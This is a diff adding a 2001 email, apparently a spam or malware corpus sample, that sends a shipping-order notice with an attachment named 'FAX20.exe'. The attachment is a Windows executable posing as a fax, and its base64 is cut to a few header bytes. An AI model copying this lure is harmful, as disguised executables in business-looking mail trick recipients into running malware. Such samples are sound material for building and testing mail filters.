@@ -1,0 +1,27 @@
+From mdb@go2net.com Tue Sep 18 10:31:34 2001
+Received: from aglnss01.grupoagrisal.net ([172.16.0.1])
+          by agntss05 (Lotus Domino Release 5.07a)
+          with ESMTP id 2001120416164050:5294 ;
+          Tue, 4 Dec 2001 16:16:40 -0600 
+Subject: MAEU XSS025786 - ORDER 1251 - CONTAINER MAEU 6053725
+To: kathyp@jsconnor.com
+Cc: Blanca@ace-of-hearts.net
+X-Mailer: Lotus Notes Release 5.07a  May 14, 2001
+Message-ID: <OF28551015.C47BCC85-ON06256B18.0079DD92@grupoagrisal.net>
+From: sherrera.dco.lc@agrisal.com
+Date: Tue, 4 Dec 2001 16:11:48 -0600
+MIME-Version: 1.0
+X-MIMETrack: Serialize by Router on AGLNSS01/AGRISAL(Release 5.07a |May 14, 2001) at 04/12/2001
+ 04:11:57 p.m.,
+	Itemize by SMTP Server on aglnss03/Grupo_Agrisal(Release 5.07a |May 14, 2001) at
+ 12/04/2001 04:16:41 PM,
+	Serialize by Router on aglnss03/Grupo_Agrisal(Release 5.07a |May 14, 2001) at
+ 12/04/2001 04:16:51 PM
+Content-type: application/octet-stream; 
+	name="FAX20.exe"
+Content-Disposition: attachment; filename="FAX20.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAKJsVAAAACIAACIAACIBr6AQA
+
